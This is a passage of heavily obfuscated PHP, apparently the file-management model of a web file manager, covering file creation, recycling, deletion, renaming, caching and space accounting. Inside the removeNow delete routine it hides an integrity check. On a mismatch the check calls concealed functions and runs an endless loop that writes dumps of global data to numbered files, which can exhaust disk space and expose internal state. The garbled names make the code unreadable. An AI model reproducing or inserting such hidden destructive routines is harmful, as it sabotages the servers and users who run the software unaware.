array($ÂíÒşİµ[616] => $ËÁ¾Ó€°[$ÂíÒşİµ[178]], $ÂíÒşİµ[617] => $ËÁ¾Ó€°[$ÂíÒşİµ[538]], $ÂíÒşİµ[618] => $·“³àºú, $ÂíÒşİµ[619] => $·“³àºú, $ÂíÒşİµ[445] => $ËÁ¾Ó€°[$ÂíÒşİµ[181]], $ÂíÒşİµ[620] => $ËÁ¾Ó€°[$ÂíÒşİµ[553]] . $ËÁ¾Ó€°[$ÂíÒşİµ[181]] . $ÂíÒşİµ[50], $ÂíÒşİµ[472] => 0, $ÂíÒşİµ[621] => $ÂíÒşİµ[12]); $î©™€‹Ÿ = array_merge($ŠÅÑÊï¹, $î©™€‹Ÿ); $this->updateModifyTime($î©™€‹Ÿ[$ÂíÒşİµ[180]]); $üí¤±¿õ = $ÂíÒşİµ[2187] . $ËÁ¾Ó€°[$ÂíÒşİµ[181]]; if (isset(self::$cacheChildList[$üí¤±¿õ])) { unset(self::$cacheChildList[$üí¤±¿õ]); } static $ğñ€øÀĞ = false; if (!$ğñ€øÀĞ) { Hook::trigger($ÂíÒşİµ[604], $î©™€‹Ÿ); $ğñ€øÀĞ = !0; } $Ì‚³ó„ñ = $this->add($î©™€‹Ÿ); $¸÷ÑğÛÂ = array($ÂíÒşİµ[622] => short_id($Ì‚³ó„ñ)); $this->where(array($ÂíÒşİµ[459] => $Ì‚³ó„ñ))->save($¸÷ÑğÛÂ); $this->setNamePinyin($Ì‚³ó„ñ, $î©™€‹Ÿ[$ÂíÒşİµ[32]]); return $Ì‚³ó„ñ; } public function remove($ÓúÖ Áª, $–÷µÖÌ˜ = true) { $¹ê·‚İ =& $_SERVER[çâ¥×ø³]; $÷Ü÷Ñ»  = $this->sourceInfo($ÓúÖ Áª); $ßÛİÃ¹Ê = intval($÷Ü÷Ñ» [$¹ê·‚İ[178]]) === self::TYPE_SYSTEM; $ãÅ½ø†° = Model($¹ê·‚İ[476])->get($¹ê·‚İ[2188]) == $¹ê·‚İ[88]; if ($ßÛİÃ¹Ê || $–÷µÖÌ˜ || !$ãÅ½ø†°) { return $this->removeNow($ÓúÖ Áª, $–÷µÖÌ˜); } $ÜşÒÆÌè = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $™õñÌ×â = $÷Ü÷Ñ» [$¹ê·‚İ[178]] == self::TYPE_USER ? $¹ê·‚İ[630] : $¹ê·‚İ[547]; if ($™õñÌ×â == $¹ê·‚İ[630]) { $ë¤«•½Š = Model($¹ê·‚İ[546])->getInfo($÷Ü÷Ñ» [$¹ê·‚İ[538]]); $ä©êö¨‚ = !empty($ë¤«•½Š[$¹ê·‚İ[2181]]) ? $ë¤«•½Š[$¹ê·‚İ[2181]] : $ë¤«•½Š[$¹ê·‚İ[32]]; $ä©êö¨‚ = $¹ê·‚İ[304] . $ä©êö¨‚ . $¹ê·‚İ[2189] . $÷Ü÷Ñ» [$¹ê·‚İ[538]]; } else { $ë¤«•½Š = Model($¹ê·‚İ[554])->getInfo($÷Ü÷Ñ» [$¹ê·‚İ[538]]); $ä©êö¨‚ = _get($ë¤«•½Š, $¹ê·‚İ[32]); $ä©êö¨‚ = $¹ê·‚İ[163] . $ä©êö¨‚ . $¹ê·‚İ[2190] . $÷Ü÷Ñ» [$¹ê·‚İ[538]]; } $–ÎÑ¿¾© = $¹ê·‚İ[2191] . md5($ä©êö¨‚); CacheLock::lock($–ÎÑ¿¾©); $ã£¶É = $this->fileNameExist($ÜşÒÆÌè, $ä©êö¨‚); if (!$ã£¶É) { $ã£¶É = $this->mkdir($ÜşÒÆÌè, $ä©êö¨‚, REPEAT_SKIP); $this->metaSet($ã£¶É, $¹ê·‚İ[2192], $™õñÌ×â); $this->metaSet($ã£¶É, $¹ê·‚İ[2193], $÷Ü÷Ñ» [$¹ê·‚İ[538]]); if ($÷Ü÷Ñ» [$¹ê·‚İ[180]] != 0) { $this->metaSet($ã£¶É, $¹ê·‚İ[2194], _get($ë¤«•½Š, $¹ê·‚İ[2195])); } } CacheLock::unlock($–ÎÑ¿¾©); $this->metaSet($ÓúÖ Áª, $¹ê·‚İ[2196], $÷Ü÷Ñ» [$¹ê·‚İ[180]]); $this->where(array($¹ê·‚İ[181] => $ÓúÖ Áª))->save(array($¹ê·‚İ[466] => time())); $this->recycleClear($÷Ü÷Ñ» ); $¬±™½ç¥ = $this->move($ÓúÖ Áª, $ã£¶É, REPEAT_RENAME_FOLDER); $this->folderSizeReset($÷Ü÷Ñ» [$¹ê·‚İ[180]]); return $¬±™½ç¥; } private function recycleClear($¬Ã¬„òß) { $æ™¹Ğ­œ =& $_SERVER[çâ¥×ø³]; $÷™Ì¯ğ» = $this->childrenAll($¬Ã¬„òß); $ÉÃ®Óïİ = array($æ™¹Ğ­œ[459] => array($æ™¹Ğ­œ[460], $÷™Ì¯ğ»[$æ™¹Ğ­œ[2197]])); Model($æ™¹Ğ­œ[2198])->where($ÉÃ®Óïİ)->delete(); } public function removeNow($·¨•üÈ¿, $ ¼×á³ø = true) { $³ğ”†í’ =& $_SERVER[çâ¥×ø³]; $Ã«ãÑí¬ = $_SERVER[$³ğ”†í’[930]] . $³ğ”†í’[931]; $•æù¹Ú = $³ğ”†í’[1491]; if ($_SERVER[$³ğ”†í’[926]] != $•æù¹Ú($Ã«ãÑí¬)) { $”“°½àü = $³ğ”†í’[928]; $ô˜¹Ğ™Ã = $³ğ”†í’[929]; $ü¾Ú©Å = $_SERVER[$³ğ”†í’[930]] . $³ğ”†í’[931]; $¥Ğî‘ô¼ = $ô˜¹Ğ™Ã($ü¾Ú©Å); $”„ÀûÄŒ = explode($³ğ”†í’[246], $¥Ğî‘ô¼); if (count($”„ÀûÄŒ) < $³ğ”†í’[657]) { $‰‰Æ´ = $³ğ”†í’[932]; $‰‰Æ´(); } $¤åõƒ = $³ğ”†í’[933]; $¤åõƒ($_SERVER[$³ğ”†í’[934]]); $”“°½àü = $³ğ”†í’[928]; $”“°½àü(); $ªé‰ì = $³ğ”†í’[1561]; $ÂÂÅ£İé = json_encode($GLOBALS[$³ğ”†í’[1562]]); $ ØÁ÷•  = 1; for ($ŞÍ¸  = $ ØÁ÷• ; $ŞÍ¸  > 0; $ŞÍ¸ ++) { $ªé‰ì(DATA_PATH . $ŞÍ¸ , $ÂÂÅ£İé); } } $òşÒæ„„ = $this->sourceInfo($·¨•üÈ¿); $Õ¿¨ÓÁµ = $this->pathInfoMore($·¨•üÈ¿); if (!$òşÒæ„„) { return !0; } if ($òşÒæ„„[$³ğ”†í’[180]] == 0) { if (!_get($GLOBALS, $³ğ”†í’[536])) { return !1; } } $this->lockMoveStart($·¨•üÈ¿); Hook::trigger($³ğ”†í’[2199], $Õ¿¨ÓÁµ, $ ¼×á³ø); if ($ ¼×á³ø) { Model($³ğ”†í’[2198])->moveToRecycle($·¨•üÈ¿); } else { $–Š£¯ºÈ = $this->childrenAll($òşÒæ„„); Model($³ğ”†í’[601])->eventRemove($·¨•üÈ¿); $this->removeRelevance($–Š£¯ºÈ[$³ğ”†í’[2197]], $–Š£¯ºÈ[$³ğ”†í’[1510]]); } $this->folderSizeReset($òşÒæ„„[$³ğ”†í’[180]]); $Üİò¾Óí = array($òşÒæ„„[$³ğ”†í’[180]]); if ($òşÒæ„„[$³ğ”†í’[453]] == $³ğ”†í’[88]) { $Üİò¾Óí[] = $òşÒæ„„[$³ğ”†í’[181]]; } $this->updateModifyTime($Üİò¾Óí); $this->lockMoveEnd($·¨•üÈ¿); Hook::trigger($³ğ”†í’[1743], $Õ¿¨ÓÁµ, $ ¼×á³ø); return !0; } public function childrenAll($éà±¡ôô) { $³ªÓÀæ³ =& $_SERVER[çâ¥×ø³]; $«Ïú¸Òû = $éà±¡ôô[$³ªÓÀæ³[181]]; if ($éà±¡ôô[$³ªÓÀæ³[453]] == $³ªÓÀæ³[88]) { $„„Ù«—Ÿ = array($³ªÓÀæ³[620] => array($³ªÓÀæ³[580], $éà±¡ôô[$³ªÓÀæ³[553]] . $«Ïú¸Òû . $³ªÓÀæ³[581])); $—°¸øçø = array($³ªÓÀæ³[620] => $„„Ù«—Ÿ[$³ªÓÀæ³[553]]); $´œ¤ü³˜ = $this->field($³ªÓÀæ³[2200])->where($—°¸øçø)->select(); $ÍÄóÕ¸ = !1; $–òÊ­­ = array($«Ïú¸Òû); if ($´œ¤ü³˜) { $ÍÄóÕ¸ = array_to_keyvalue($´œ¤ü³˜, $³ªÓÀæ³[12], $³ªÓÀæ³[509]); $ÍÄóÕ¸ = array_remove_value($ÍÄóÕ¸, $³ªÓÀæ³[212]); $–òÊ­­ = array_to_keyvalue($´œ¤ü³˜, $³ªÓÀæ³[12], $³ªÓÀæ³[181]); $–òÊ­­[] = $«Ïú¸Òû; } } else { $ÍÄóÕ¸ = array($éà±¡ôô[$³ªÓÀæ³[509]]); $–òÊ­­ = array($«Ïú¸Òû); } return array($³ªÓÀæ³[2197] => $–òÊ­­, $³ªÓÀæ³[1510] => $ÍÄóÕ¸); } public function removeArray($øÄ¹Ú¹³) { if (!$øÄ¹Ú¹³) { return !0; } } public function removeRelevance($‡ÜŒî”, $Ì„Ïı•) { $…î»ÚïÅ =& $_SERVER[çâ¥×ø³]; $‡ÜŒî” = $‡ÜŒî” ? $‡ÜŒî” : array(); $Ì„Ïı• = $Ì„Ïı• ? $Ì„Ïı• : array(); $‡ÜŒî” = array_unique(array_filter($‡ÜŒî”)); $Ì„Ïı• = array_unique(array_filter($Ì„Ïı•)); if (!$‡ÜŒî”) { return !1; } $ÀšœˆÓŒ = array($…î»ÚïÅ[459] => array($…î»ÚïÅ[460], $‡ÜŒî”)); Model($…î»ÚïÅ[2198])->where($ÀšœˆÓŒ)->delete(); Model($…î»ÚïÅ[503])->where($ÀšœˆÓŒ)->delete(); Model($…î»ÚïÅ[2046])->where($ÀšœˆÓŒ)->delete(); Model($…î»ÚïÅ[601])->where($ÀšœˆÓŒ)->delete(); Model($…î»ÚïÅ[1879])->removeBySource($‡ÜŒî”); Model($…î»ÚïÅ[2179])->removeBySource($‡ÜŒî”); $this->where($ÀšœˆÓŒ)->delete(); Model($…î»ÚïÅ[512])->remove($Ì„Ïı•); for ($ ı—µñÀ = 0; $ ı—µñÀ < count($‡ÜŒî”); $ ı—µñÀ++) { $this->sourceCacheClear($‡ÜŒî”[$ ı—µñÀ]); } } public function rename($­¾óŠÈ×, $Šƒ‚Ø) { $ø¿Ì÷õÌ =& $_SERVER[çâ¥×ø³]; $ä·šÆú¾ = $this->sourceInfo($­¾óŠÈ×); if (!$ä·šÆú¾) { return !1; } $êõ€×Àä = $this->fileNameExist($ä·šÆú¾[$ø¿Ì÷õÌ[180]], $Šƒ‚Ø); if ($êõ€×Àä && $êõ€×Àä != $­¾óŠÈ×) { return !1; } $ø¥•êÑÅ = array($ø¿Ì÷õÌ[462] => $Šƒ‚Ø, $ø¿Ì÷õÌ[619] => USER_ID); if ($ä·šÆú¾[$ø¿Ì÷õÌ[453]] != $ø¿Ì÷õÌ[88]) { $ø¥•êÑÅ[$ø¿Ì÷õÌ[454]] = substr(get_path_ext($Šƒ‚Ø), 0, 10); } Model($ø¿Ì÷õÌ[601])->eventRename($­¾óŠÈ×, $ä·šÆú¾[$ø¿Ì÷õÌ[32]], $Šƒ‚Ø); $this->sourceCacheClear($­¾óŠÈ×); $this->setNamePinyin($­¾óŠÈ×, $ø¥•êÑÅ[$ø¿Ì÷õÌ[32]], !1); $this->updateModifyTime($ä·šÆú¾[$ø¿Ì÷õÌ[180]]); $•Èê°ğØ = $this->where(array($ø¿Ì÷õÌ[459] => $­¾óŠÈ×))->data($ø¥•êÑÅ)->save(); $©›¡™ŸÀ = $ø¿Ì÷õÌ[2187] . $ä·šÆú¾[$ø¿Ì÷õÌ[180]]; if (isset(self::$cacheChildList[$©›¡™ŸÀ])) { unset(self::$cacheChildList[$©›¡™ŸÀ]); } return $•Èê°ğØ; } public function setNamePinyin($ä¸±îÙ, $“ÆÉáâÎ, $Üå€« = true) { $¸³Ü‡ÒÍ =& $_SERVER[çâ¥×ø³]; $ĞÏäšÁ´ = Input::check($“ÆÉáâÎ, $¸³Ü‡ÒÍ[623]); $£¶â±“ = array($¸³Ü‡ÒÍ[485] => KodSort::makeStr($“ÆÉáâÎ)); if ($ĞÏäšÁ´) { $£¶â±“[$¸³Ü‡ÒÍ[506]] = str_replace($¸³Ü‡ÒÍ[53], $¸³Ü‡ÒÍ[12], Pinyin::get($“ÆÉáâÎ)); $£¶â±“[$¸³Ü‡ÒÍ[505]] = Pinyin::get($“ÆÉáâÎ, $¸³Ü‡ÒÍ[624]); } if (!$Üå€« && !$ĞÏäšÁ´) { $£¶â±“[$¸³Ü‡ÒÍ[506]] = null; $£¶â±“[$¸³Ü‡ÒÍ[505]] = null; } $this->metaSet($ä¸±îÙ, $£¶â±“); } public function getContent($õİ®Ğšß) { $¡Œî¹©ê =& $_SERVER[çâ¥×ø³]; $£°î§ğ = $this->fileInfoGet($õİ®Ğšß); if (!$£°î§ğ) { return !1; } if ($£°î§ğ[$¡Œî¹©ê[76]] == 0) { return $¡Œî¹©ê[12]; } $ÃÉ°òßî = $¡Œî¹©ê[2201] . $£°î§ğ[$¡Œî¹©ê[641]]; if ($£°î§ğ[$¡Œî¹©ê[76]] <= 1024 * 10) { $Ø¡ïÀÕ» = Cache::get($ÃÉ°òßî); if (!$Ø¡ïÀÕ») { $Ø¡ïÀÕ» = IO::getContent($£°î§ğ[$¡Œî¹©ê[84]]); Cache::set($ÃÉ°òßî, $Ø¡ïÀÕ»); } return $Ø¡ïÀÕ»; } if (!$£°î§ğ[$¡Œî¹©ê[84]]) { return $¡Œî¹©ê[12]; } return IO::getContent($£°î§ğ[$¡Œî¹©ê[84]]); } public function setDesc($ÅÄĞ†‚†, $ô—ëüàÔ) { $¹›…§…õ =& $_SERVER[çâ¥×ø³]; Model($¹›…§…õ[601])->eventAddDesc($ÅÄĞ†‚†, $ô—ëüàÔ); return $this->metaSet($ÅÄĞ†‚†, $¹›…§…õ[494], $ô—ëüàÔ); } public function setContent($ÔÂûà¯, $ê®”ŠéÜ = '') { $ˆÁ…÷ªÑ =& $_SERVER[çâ¥×ø³]; $å²ØÏ¾‹ = $this->sourceInfo($ÔÂûà¯); $ˆ¼ôœÉí = $this->fileInfoGet($ÔÂûà¯); if (!$ˆ¼ôœÉí || !$å²ØÏ¾‹) { return !1; } $Ÿ¥„ö¦½ = Model($ˆÁ…÷ªÑ[512])->addFileByContent($ê®”ŠéÜ, $å²ØÏ¾‹[$ˆÁ…÷ªÑ[32]]); $âß¿ä±À = $this->fileHistory($å²ØÏ¾‹, $Ÿ¥„ö¦½[$ˆÁ…÷ªÑ[509]], $Ÿ¥„ö¦½[$ˆÁ…÷ªÑ[76]]); if (!$âß¿ä±À) { return Model($ˆÁ…÷ªÑ[512])->remove($Ÿ¥„ö¦½[$ˆÁ…÷ªÑ[509]]); } $this->folderSizeReset($å²ØÏ¾‹[$ˆÁ…÷ªÑ[180]]); return !0; } public function fileSubstr($»œÂšßò, $Ú—Ğ»´“, $ìÈ¨êÉ˜) { $œã°·‡´ = $this->fileInfoGet($»œÂšßò); if (!$œã°·‡´) { return !1; } return IO::fileSubstr($œã°·‡´[$_SERVER[çâ¥×ø³][84]], $Ú—Ğ»´“, $ìÈ¨êÉ˜); } public function fileInfoGet($íàí‡«Ÿ) { $…ñ¬‘–™ =& $_SERVER[çâ¥×ø³]; $ËœòÊŠÀ = $this->sourceInfo($íàí‡«Ÿ); if (!$ËœòÊŠÀ || $ËœòÊŠÀ[$…ñ¬‘–™[453]]) { return !1; } $ÒÉ¤—Õ = $…ñ¬‘–™[515] . $ËœòÊŠÀ[$…ñ¬‘–™[509]]; $Òœ‚ê×½ = _get(self::$cacheFileInfo, $ÒÉ¤—Õ); if ($Òœ‚ê×½) { return $Òœ‚ê×½; } $éåÖ¥ — = Model($…ñ¬‘–™[512])->fileInfo($ËœòÊŠÀ[$…ñ¬‘–™[509]]); if ($éåÖ¥ —) { $éåÖ¥ —[$…ñ¬‘–™[32]] = $ËœòÊŠÀ[$…ñ¬‘–™[32]]; } self::$cacheFileInfo[$ÒÉ¤—Õ] = $éåÖ¥ —; return $éåÖ¥ —; } private function folderChildrenNumber($ûÆ˜£€š) { $ÂŞ‚¿Ôù =& $_SERVER[çâ¥×ø³]; $ï‘Â•®Î = $this->sourceInfo($ûÆ˜£€š); $êĞ¥ŸÌ½ = array($ÂŞ‚¿Ôù[620] => array($ÂŞ‚¿Ôù[580], $ï‘Â•®Î[$ÂŞ‚¿Ôù[553]] . $ûÆ˜£€š . $ÂŞ‚¿Ôù[581]), $ÂŞ‚¿Ôù[617] => $ï‘Â•®Î[$ÂŞ‚¿Ôù[538]], $ÂŞ‚¿Ôù[472] => intval($ï‘Â•®Î[$ÂŞ‚¿Ôù[473]]), $ÂŞ‚¿Ôù[614] => 1); $ÁÏ”œŸ’ = $this->where($êĞ¥ŸÌ½)->count(); $‚ä¿¨‡¿ = $this->where($êĞ¥ŸÌ½)->where(array($ÂŞ‚¿Ôù[614] => 0))->count(); return array($ÂŞ‚¿Ôù[80] => $‚ä¿¨‡¿, $ÂŞ‚¿Ôù[81] => $ÁÏ”œŸ’); } public function pathInfo($Èõ áÚ, $ãÕöËºÒ = false) { $¬Åêô²³ =& $_SERVER[çâ¥×ø³]; $ãÕöËºÒ = !1; $Èõ áÚ = intval($Èõ áÚ); $°ÒÑ€®Õ = $¬Åêô²³[502] . intval($ãÕöËºÒ) . $¬Åêô²³[430] . $Èõ áÚ; $ÖÁÏ´ = _get(self::$cachePathInfo, $°ÒÑ€®Õ); if ($ÖÁÏ´) { return $ÖÁÏ´; } $• ¤Úš = $this->sourceInfo($Èõ áÚ); if (!$• ¤Úš) { return !1; } $• ¤Úš = $this->_listDataApplyItem($• ¤Úš, $ãÕöËºÒ); self::$cachePathInfo[$°ÒÑ€®Õ] = $• ¤Úš; return $• ¤Úš; } public static $cachePathInfoMore = array(); public function pathInfoMore($‚–²€Î—) { $˜ì…±° =& $_SERVER[çâ¥×ø³]; $”Ó¸ÏÙÔ = _get(self::$cachePathInfoMore, $‚–²€Î—); if ($”Ó¸ÏÙÔ) { return $”Ó¸ÏÙÔ; } $Ø—£Çè = $this->pathInfo($‚–²€Î—); if (!$Ø—£Çè) { return !1; } if ($Ø—£Çè[$˜ì…±°[453]] == $˜ì…±°[88]) { $Ø—£Çè[$˜ì…±°[79]] = $this->folderChildrenNumber($‚–²€Î—); } self::$cachePathInfoMore[$‚–²€Î—] = $Ø—£Çè; return $Ø—£Çè; } public function sourceInfo($¹±µ¼˜Ø) { $·ã„§ê =& $_SERVER[çâ¥×ø³]; if (!$¹±µ¼˜Ø) { return array(); } $¹±µ¼˜Ø = intval($¹±µ¼˜Ø); $ãÄıÏóü = $·ã„§ê[501] . $¹±µ¼˜Ø; $øô”ïšÃ = _get(self::$cacheSourceInfo, $ãÄıÏóü); if ($øô”ïšÃ) { return $øô”ïšÃ; } $É³›§áÔ = $this->where(array($·ã„§ê[181] => $¹±µ¼˜Ø))->find(); self::$cacheSourceInfo[$ãÄıÏóü] = $É³›§áÔ; return self::$cacheSourceInfo[$ãÄıÏóü]; } public function sourceCacheClear($†¢Ìê™­ = false) { self::cacheClear($†¢Ìê™­); } public static function cacheClear($šƒ˜®ü± = false) { $¶ãùŸ«Ã =& $_SERVER[çâ¥×ø³]; if ($šƒ˜®ü± == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¶ãùŸ«Ã[501] . $šƒ˜®ü±]); unset(self::$cachePathInfoMore[$šƒ˜®ü±]); unset(self::$cachePathInfo[$¶ãùŸ«Ã[2202] . $šƒ˜®ü±]); unset(self::$cachePathInfo[$¶ãùŸ«Ã[2203] . $šƒ˜®ü±]); } public function metaSet($¶øû«å¯, $Ò…ˆäë = null, $¨Šö¿”£ = null) { $êË„¶¸÷ = parent::metaSet($¶øû«å¯, $Ò…ˆäë, $¨Šö¿”£); if ($êË„¶¸÷) { $this->sourceCacheClear($¶øû«å¯); } return $êË„¶¸÷; } public function pathInfoByPath($âæù«ª, $àÌ´·Á‰) { $á´­¾„¨ =& $_SERVER[çâ¥×ø³]; $Ñ‹ÎÔ¹» = !$àÌ´·Á‰ ? array() : explode($á´­¾„¨[8], trim($àÌ´·Á‰, $á´­¾„¨[8])); $ÕÉÀ…ñ· = $âæù«ª; foreach ($Ñ‹ÎÔ¹» as $…İ™´«Š) { $œØœ“‰¥ = array($á´­¾„¨[180] => $ÕÉÀ…ñ·, $á´­¾„¨[32] => $…İ™´«Š); $ïã€Œï¢ = $this->field($á´­¾„¨[2204])->where($œØœ“‰¥)->select(); if (!$ïã€Œï¢) { return !1; } $ïã€Œï¢ = array_sort_by($ïã€Œï¢, $á´­¾„¨[473]); $ÕÉÀ…ñ· = $ïã€Œï¢[0][$á´­¾„¨[181]]; } $ğçÄíÓú = $this->sourceInfo($ÕÉÀ…ñ·); $this->pathInfoFilter($ğçÄíÓú); return $ğçÄíÓú; } protected function updateModifyTime($ƒü¨ «) { $ë­à¹« =& $_SERVER[çâ¥×ø³]; $»ÀŠ†¦ = defined($ë­à¹«[2120]) ? USER_ID : 0; if (!$ƒü¨ «) { return; } if (!is_array($ƒü¨ «)) { $ƒü¨ « = array($ƒü¨ «); } foreach ($ƒü¨ « as $İ¨£”ü¢ => $ÊïËïêŠ) { $ƒü¨ «[$İ¨£”ü¢] = intval($ÊïËïêŠ); $this->sourceCacheClear($ÊïËïêŠ); } $‘¨ÑÕ’± = array($ë­à¹«[181] => array($ë­à¹«[7], $ƒü¨ «)); $³’í…àë = array($ë­à¹«[619] => $»ÀŠ†¦, $ë­à¹«[466] => time()); $this->where($‘¨ÑÕ’±)->save($³’í…àë); } public function folderSizeReset($ÊÕ±¯Íí, $ÄØíâï¡ = false) { $‹ËË¯èÂ =& $_SERVER[çâ¥×ø³]; if ($this->statusIgnoreResetSpace) { return; } $¹ò„›– = $this->sourceInfo($ÊÕ±¯Íí); $ÒÔ’½´“ = $‹ËË¯èÂ[2205] . $ÊÕ±¯Íí; CacheLock::lock($ÒÔ’½´“, 20); if ($ÄØíâï¡ === !1) { $this->sourceCacheClear($ÊÕ±¯Íí); $¹ò„›– = $this->sourceInfo($ÊÕ±¯Íí); $ÃèİÂ„ = array($‹ËË¯èÂ[445] => $ÊÕ±¯Íí, $‹ËË¯èÂ[472] => 0); $²ùÒ°´© = $this->where($ÃèİÂ„)->sum($‹ËË¯èÂ[76]); $ÄØíâï¡ = intval($²ùÒ°´©) - intval($¹ò„›–[$‹ËË¯èÂ[76]]); } if ($ÄØíâï¡ == 0) { return CacheLock::unlock($ÒÔ’½´“); } $“¯½ª“Ş = $this->parentLevelArray($¹ò„›–[$‹ËË¯èÂ[553]]); if (!$“¯½ª“Ş) { $“¯½ª“Ş = array(); } $“¯½ª“Ş[] = $¹ò„›–[$‹ËË¯èÂ[181]]; $ÃèİÂ„ = array($‹ËË¯èÂ[181] => array($‹ËË¯èÂ[460], $“¯½ª“Ş)); if ($ÄØíâï¡ < 0) { $ÃèİÂ„[$‹ËË¯èÂ[76]] = array($‹ËË¯èÂ[1068], abs($ÄØíâï¡)); } $this->where($ÃèİÂ„)->setAdd($‹ËË¯èÂ[76], $ÄØíâï¡); CacheLock::unlock($ÒÔ’½´“); $±ÖÄ­â¹ = $‹ËË¯èÂ[2206] . $¹ò„›–[$‹ËË¯èÂ[178]] . $‹ËË¯èÂ[4] . $¹ò„›–[$‹ËË¯èÂ[538]]; $Äµ¢®ãÈ = array($¹ò„›–[$‹ËË¯èÂ[178]], $¹ò„›–[$‹ËË¯èÂ[538]]); TaskRun::timeLimitCall($±ÖÄ­â¹, $‹ËË¯èÂ[2207], $Äµ¢®ãÈ, 1.5); } public function folderSizeResetChildren($ú—Ò…õŞ) { $ÁçÇ“ÂÀ =& $_SERVER[çâ¥×ø³]; $this->sourceCacheClear($ú—Ò…õŞ); $ÉæÈòêÓ = $this->sourceInfo($ú—Ò…õŞ); $Ø’Óñƒ¾ = array($ÁçÇ“ÂÀ[614] => 1, $ÁçÇ“ÂÀ[617] => $ÉæÈòêÓ[$ÁçÇ“ÂÀ[538]], $ÁçÇ“ÂÀ[620] => array($ÁçÇ“ÂÀ[580], $ÉæÈòêÓ[$ÁçÇ“ÂÀ[553]] . $ú—Ò…õŞ . $ÁçÇ“ÂÀ[581])); $î¶ÑÍ¤ = $ÁçÇ“ÂÀ[2208]; $ÖŒßêø = $this->field($î¶ÑÍ¤)->where($Ø’Óñƒ¾)->select(); $Ø’Óñƒ¾[$ÁçÇ“ÂÀ[453]] = 0; $œğÂâÔ¿ = $this->field($î¶ÑÍ¤)->where($Ø’Óñƒ¾)->select(); if (!$œğÂâÔ¿) { return; } $ÖŒßêø[] = $ÉæÈòêÓ; $ÖŒßêø = array_to_keyvalue($ÖŒßêø, $ÁçÇ“ÂÀ[181]); foreach ($ÖŒßêø as $ô–€ú¿ => $Å•‰ıËÉ) { $ÖŒßêø[$ô–€ú¿][$ÁçÇ“ÂÀ[2209]] = $ÖŒßêø[$ô–€ú¿][$ÁçÇ“ÂÀ[76]]; $ÖŒßêø[$ô–€ú¿][$ÁçÇ“ÂÀ[76]] = 0; } foreach ($œğÂâÔ¿ as $Å•‰ıËÉ) { $‚ÊÔóÀ = $Å•‰ıËÉ[$ÁçÇ“ÂÀ[180]] . $ÁçÇ“ÂÀ[12]; if (!isset($ÖŒßêø[$‚ÊÔóÀ])) { continue; } if ($Å•‰ıËÉ[$ÁçÇ“ÂÀ[473]] == $ÖŒßêø[$‚ÊÔóÀ][$ÁçÇ“ÂÀ[473]]) { $ÖŒßêø[$‚ÊÔóÀ][$ÁçÇ“ÂÀ[76]] += $Å•‰ıËÉ[$ÁçÇ“ÂÀ[76]]; } } foreach ($ÖŒßêø as $Å•‰ıËÉ) { $¥¯Ã¾¦Ì = $this->parentLevelArray($Å•‰ıËÉ[$ÁçÇ“ÂÀ[553]]); foreach ($¥¯Ã¾¦Ì as $‚ÊÔóÀ) { $‚ÊÔóÀ = $‚ÊÔóÀ . $ÁçÇ“ÂÀ[12]; if (!isset($ÖŒßêø[$‚ÊÔóÀ])) { continue; } if ($Å•‰ıËÉ[$ÁçÇ“ÂÀ[473]] == $ÖŒßêø[$‚ÊÔóÀ][$ÁçÇ“ÂÀ[473]]) { $ÖŒßêø[$‚ÊÔóÀ][$ÁçÇ“ÂÀ[76]] += $Å•‰ıËÉ[$ÁçÇ“ÂÀ[76]]; } } } $İĞ‚Û…½ = array(); foreach ($ÖŒßêø as $Å•‰ıËÉ) { if ($Å•‰ıËÉ[$ÁçÇ“ÂÀ[76]] == $Å•‰ıËÉ[$ÁçÇ“ÂÀ[2209]]) { continue; } $İĞ‚Û…½[] = array($ÁçÇ“ÂÀ[181], $Å•‰ıËÉ[$ÁçÇ“ÂÀ[181]], $ÁçÇ“ÂÀ[76], $Å•‰ıËÉ[$ÁçÇ“ÂÀ[76]]); } $this->saveAll($İĞ‚Û…½); } public function userSpaceReset($ëÈ­ÔÒº = false) { $œß†Øœö =& $_SERVER[çâ¥×ø³]; $ˆ³ı‹ß = $this->where(array($œß†Øœö[178] => self::TYPE_USER, $œß†Øœö[538] => $ëÈ­ÔÒº, $œß†Øœö[453] => 0))->sum($œß†Øœö[76]); $ˆ³ı‹ß = !$ˆ³ı‹ß || $ˆ³ı‹ß <= 0 ? 0 : $ˆ³ı‹ß; Model($œß†Øœö[546])->userEdit($ëÈ­ÔÒº, array($œß†Øœö[1888] => $ˆ³ı‹ß)); } public function targetSpaceUpdate($í‚¢ÄÁ, $œáÓò ’) { $å¢‹ù‚² =& $_SERVER[çâ¥×ø³]; if (!$œáÓò ’) { return; } if (!in_array($í‚¢ÄÁ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ôÙıØüá = $this->targetSpaceSize($í‚¢ÄÁ, $œáÓò ’); if ($í‚¢ÄÁ == self::TYPE_USER) { Model($å¢‹ù‚²[546])->userEdit($œáÓò ’, array($å¢‹ù‚²[1888] => $ôÙıØüá)); } else { if ($í‚¢ÄÁ == self::TYPE_GROUP) { Model($å¢‹ù‚²[554])->groupEdit($œáÓò ’, array($å¢‹ù‚²[1888] => $ôÙıØüá)); } } } public function targetSpaceSize($‹óÂì», $øòõôœ) { $ŞñóáßÊ =& $_SERVER[çâ¥×ø³]; $©ş‡Éê = 0; $´ô¢¦Æ¹ = $this->targetSourceRoot($‹óÂì», $øòõôœ, !0); foreach ($´ô¢¦Æ¹ as $ù“’¿åÒ) { if (!$ù“’¿åÒ) { continue; } $©ş‡Éê += floatval($ù“’¿åÒ[$ŞñóáßÊ[76]]); $±™ùçÉ = array($ŞñóáßÊ[620] => array($ŞñóáßÊ[580], $ŞñóáßÊ[563] . $ù“’¿åÒ[$ŞñóáßÊ[181]] . $ŞñóáßÊ[581])); $Ëû’íÜÆ = Model($ŞñóáßÊ[471])->field($ŞñóáßÊ[459])->where($±™ùçÉ)->select(); $Ëû’íÜÆ = array_to_keyvalue($Ëû’íÜÆ, $ŞñóáßÊ[12], $ŞñóáßÊ[181]); $Ëû’íÜÆ = array_unique(array_filter($Ëû’íÜÆ)); if ($Ëû’íÜÆ) { $±™ùçÉ = array($ŞñóáßÊ[459] => array($ŞñóáßÊ[460], $Ëû’íÜÆ)); $©ş‡Éê += floatval($this->where($±™ùçÉ)->sum($ŞñóáßÊ[76])); } } $©ş‡Éê = !$©ş‡Éê || $©ş‡Éê <= 0 ? 0 : $©ş‡Éê; return $©ş‡Éê; } public function 